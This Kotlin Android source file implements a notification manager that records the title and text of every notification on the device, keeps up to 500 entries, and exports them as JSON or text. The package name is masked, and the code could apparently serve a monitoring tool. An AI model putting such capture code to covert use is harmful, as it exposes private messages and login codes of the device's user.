package com.sync.xxx.managers

import android.app.Notification
import android.content.Context
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentLinkedQueue

/**
 * NotificationManager.kt
 * Capture and log device notifications
 * Requires NotificationListenerService implementation
 */
class NotificationManager(private val context: Context) {

    private val TAG = "NotificationManager"
    
    private val notificationQueue = ConcurrentLinkedQueue<NotificationEntry>()
    private var notificationListener: ((NotificationEntry) -> Unit)? = null
    
    private val maxQueueSize = 500

    /**
     * Check if notification access is granted
     */
    fun hasNotificationAccess(): Boolean {
        val enabledListeners = android.provider.Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners"
        )
        return enabledListeners?.contains(context.packageName) == true
    }

    /**
     * Process notification (called from NotificationListenerService)
     */
    fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val notification = sbn.notification
            val extras = notification.extras
            
            val entry = NotificationEntry(
                timestamp = System.currentTimeMillis(),
                packageName = sbn.packageName,
                appName = getAppName(sbn.packageName),
                title = extras.getString(Notification.EXTRA_TITLE) ?: "",
                text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: "",
                bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: "",
                subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: "",
                key = sbn.key
            )
            
            addEntry(entry)
        } catch (e: Exception) {
            Log.e(TAG, "Error processing notification", e)
        }
    }

    /**
     * Process notification removal (called from NotificationListenerService)
     */
    fun onNotificationRemoved(sbn: StatusBarNotification) {
        Log.d(TAG, "Notification removed: ${sbn.packageName}")
    }

    /**
     * Add notification entry
     */
    private fun addEntry(entry: NotificationEntry) {
        notificationQueue.add(entry)
        notificationListener?.invoke(entry)
        
        // Auto-trim queue if too large
        if (notificationQueue.size > maxQueueSize) {
            val excess = notificationQueue.size - (maxQueueSize / 2)
            repeat(excess) {
                notificationQueue.poll()
            }
            Log.d(TAG, "Queue overflow, removed $excess old entries")
        }
    }

    /**
     * Get app name from package name
     */
    private fun getAppName(packageName: String): String {
        return try {
            val packageManager = context.packageManager
            val appInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    /**
     * Set notification listener
     */
    fun setNotificationListener(listener: (NotificationEntry) -> Unit) {
        notificationListener = listener
    }

    /**
     * Get all notifications
     */
    fun getAllNotifications(): List<NotificationEntry> {
        return notificationQueue.toList()
    }

    /**
     * Get notifications from specific app
     */
    fun getNotificationsFrom(packageName: String): List<NotificationEntry> {
        return notificationQueue.filter { it.packageName == packageName }
    }

    /**
     * Get notifications within time range
     */
    fun getNotificationsInTimeRange(startTime: Long, endTime: Long): List<NotificationEntry> {
        return notificationQueue.filter { it.timestamp in startTime..endTime }
    }

    /**
     * Search notifications by text
     */
    fun searchNotifications(query: String): List<NotificationEntry> {
        return notificationQueue.filter { 
            it.title.contains(query, ignoreCase = true) ||
            it.text.contains(query, ignoreCase = true) ||
            it.bigText.contains(query, ignoreCase = true) ||
            it.appName.contains(query, ignoreCase = true)
        }
    }

    /**
     * Get recent notifications
     */
    fun getRecentNotifications(limit: Int = 20): List<NotificationEntry> {
        return notificationQueue.toList()
            .sortedByDescending { it.timestamp }
            .take(limit)
    }

    /**
     * Clear all notifications
     */
    fun clearNotifications() {
        notificationQueue.clear()
        Log.d(TAG, "All notifications cleared")
    }

    /**
     * Get notification count
     */
    fun getNotificationCount(): Int {
        return notificationQueue.size
    }

    /**
     * Get notifications as JSON
     */
    fun getNotificationsAsJson(): JSONArray {
        val jsonArray = JSONArray()
        notificationQueue.forEach { entry ->
            jsonArray.put(entry.toJson())
        }
        return jsonArray
    }

    /**
     * Export notifications to text
     */
    fun exportNotifications(): String {
        val sb = StringBuilder()
        val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        
        sb.append("Notification Log\n")
        sb.append("Total: ${notificationQueue.size}\n")
        sb.append("=".repeat(60)).append("\n\n")
        
        notificationQueue.forEach { entry ->
            sb.append("Time: ${dateFormat.format(Date(entry.timestamp))}\n")
            sb.append("App: ${entry.appName} (${entry.packageName})\n")
            sb.append("Title: ${entry.title}\n")
            sb.append("Text: ${entry.text}\n")
            if (entry.bigText.isNotEmpty()) {
                sb.append("Big Text: ${entry.bigText}\n")
            }
            if (entry.subText.isNotEmpty()) {
                sb.append("Sub Text: ${entry.subText}\n")
            }
            sb.append("-".repeat(60)).append("\n")
        }
        
        return sb.toString()
    }

    /**
     * Get notification statistics
     */
    fun getNotificationStatistics(): Map<String, Int> {
        val stats = notificationQueue.groupBy { it.packageName }
            .mapValues { it.value.size }
            .toList()
            .sortedByDescending { it.second }
            .toMap()
        
        return stats
    }

    /**
     * Data class for notification entry
     */
    data class NotificationEntry(
        val timestamp: Long,
        val packageName: String,
        val appName: String,
        val title: String,
        val text: String,
        val bigText: String,
        val subText: String,
        val key: String
    ) {
        fun toJson(): JSONObject {
            return JSONObject().apply {
                put("timestamp", timestamp)
                put("date", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp)))
                put("packageName", packageName)
                put("appName", appName)
                put("title", title)
                put("text", text)
                put("bigText", bigText)
                put("subText", subText)
                put("key", key)
            }
        }
    }
}
